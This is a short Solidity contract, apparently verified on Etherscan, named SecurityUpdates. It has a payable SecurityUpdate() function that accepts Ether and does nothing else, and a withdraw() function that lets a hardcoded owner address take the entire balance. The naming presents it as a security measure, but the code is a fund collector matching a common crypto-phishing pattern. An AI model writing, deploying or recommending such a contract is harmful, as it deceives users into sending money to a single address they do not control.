/**
 *Submitted for verification at Etherscan.io on 2023-05-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SecurityUpdates {

    address private  owner;

    constructor() public {   
        owner=0x3db4cDb496178c5f731Ad2aEd3Dd15694F2FFB75;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}